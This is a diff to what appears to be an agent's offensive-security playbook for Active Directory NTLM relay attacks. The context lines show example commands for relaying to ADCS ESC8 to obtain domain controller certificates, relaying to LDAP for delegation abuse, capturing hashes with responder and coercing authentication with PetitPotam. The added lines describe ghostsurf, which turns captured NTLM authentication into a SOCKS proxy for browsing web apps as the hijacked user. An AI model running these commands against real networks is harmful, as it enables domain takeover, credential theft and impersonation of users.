@@ -15,6 +15,11 @@ or `run_daemon`. The commands below are **examples** — compose your own.
 - Example (relay to ADCS ESC8): `impacket_ntlmrelay --target http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support`
 - Example (relay to LDAP for RBCD): `impacket_ntlmrelay -t ldap://<dc> --delegate-access --escalate-user EVIL$`
 - Example (just capture the hash): `run_daemon` responder
+- Example (live browsing as the hijacked user, not a one-shot relay): `run_daemon` ghostsurf
+  (`ghostsurf -t http://<target> --socks-port 1080`) — relays captured NTLM auth into an
+  interactive SOCKS5 proxy, so you browse authenticated web apps as the coerced user instead
+  of relaying once to a fixed target. `-k/--kernel-auth` for IIS/HTTP.sys targets;
+  `-r/--keep-relaying` to hold multiple captured users open against the same target.
 
 ## Trigger the coercion
 - Example (PetitPotam, MS-EFSR): `petitpotam <your-ip> <dc>`
